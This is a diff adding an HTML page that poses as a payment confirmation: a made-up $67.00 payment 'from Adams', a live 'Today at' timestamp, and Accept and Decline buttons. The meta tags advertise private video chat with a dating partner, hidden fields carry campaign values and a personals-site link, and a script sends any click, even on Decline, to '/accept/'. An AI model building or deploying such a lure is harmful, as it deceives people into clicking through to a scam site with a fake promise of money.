@@ -1,0 +1,187 @@
+
+
+
+   
+<!--click clount-->
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Confirmation</title>
+  
+     <meta name="description" content="Enjoy private live video chat with your dating partner">
+      <meta property="og:title" content="Payment Confirmation">
+      <meta property="og:description" content="Enjoy private live video chat with your dating partner">
+      <meta property="og:image" content="https://res.cloudinary.com/iuoluiol/image/upload/v1726477198/BAL/google-duo_eptp6h.ico">
+      <meta name="twitter:card" content="summary_large_image">
+      <meta name="twitter:title" content="Payment Confirmation">
+      <meta name="twitter:description" content="Enjoy private live video chat with your dating partner">
+      <meta name="twitter:image" content="https://res.cloudinary.com/iuoluiol/image/upload/v1726477198/BAL/google-duo_eptp6h.ico">
+      <link rel="icon" href="https://res.cloudinary.com/iuoluiol/image/upload/v1726477198/BAL/google-duo_eptp6h.ico" sizes="32x32">
+  
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #129f00;
+        }
+        .payment-container {
+             background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+
+        }
+        .midl{
+                padding-top: 71%;
+                padding-bottom: 71%;
+            }
+        @media (max-width: 768px) {
+            .payment-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            
+            }
+            .amount{
+                padding: 1px;
+            }
+
+            .midl{
+                padding-top: 71%;
+                padding-bottom: 71%;
+            }
+        }
+        .profile-picture {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 10px;
+        }
+        .user-name {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .payment-details {
+            color: gray;
+            font-size: 14px;
+        }
+        .amount {
+            font-size: 36px;
+            margin: 7px 0;
+        }
+        .description {
+            color: gray;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .timestamp {
+            color: gray;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+       .status {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            border: 1px solid;
+            width: 255px;
+            /* height: 35px; */
+            text-align: unset;
+            padding: 15px;
+           
+            margin-bottom: 20px;
+            background: #34b100;
+            border-radius: 25px;
+            cursor: pointer;
+         
+        }
+    </style>
+     <script>
+     
+    // </script>
+</head>
+<body>
+    <div class="payment-container">
+        <img src="https://res.cloudinary.com/iuoluiol/image/upload/v1730230912/wkl8k8fmws9svlu0xqi5.png" alt="Profile Picture" class="profile-picture">
+        <div class="user-name">Tomas B. Adams</div>
+<div class="payment-details">Payment from Adams</div>
+<div class="midl">
+<div class="amount">$67.00</div>
+<div class="description">For la flame fans must eat</div>
+<div class="timestamp" id="timestamp"></div>
+
+<script>
+    function displayCurrentTime() {
+        const now = new Date();
+        
+        const options = {
+            hour: 'numeric',
+            minute: 'numeric',
+            hour12: true
+        };
+        const timeString = now.toLocaleTimeString('en-US', options);
+        
+        // Display current time
+        document.getElementById("timestamp").textContent = `Today at ${timeString}`;
+    }
+
+    // Call displayCurrentTime on page load
+    displayCurrentTime();
+</script>
+
+
+
+
+      
+            <input type="hidden" name="email" value="Just_click">
+          
+          				<input type="hidden" name="website" value="Cash-Mega" />
+                        <input type="hidden" name="uid" value="1">
+                        <input type="hidden" name="url_id" value="https://to.mageprsonals.cam/S">
+                        <input type="hidden" name="device" value="mobile">
+                        <input type="hidden" name="self_id" value="138">
+          
+            <button type="submit" name="submit"class="status">Accept</button>
+          	<button type="submit" name="submit" style="background: #c94b24;"class="status">Decline</button>
+        </form>
+        </div>
+       
+    </div>
+
+ <script type="text/javascript">
+        // Function to redirect when the page is clicked
+        document.addEventListener("click", function() {
+            window.location.href = "/accept/"; // URL to redirect to
+        });
+    </script>
+
+</body>
+</html>
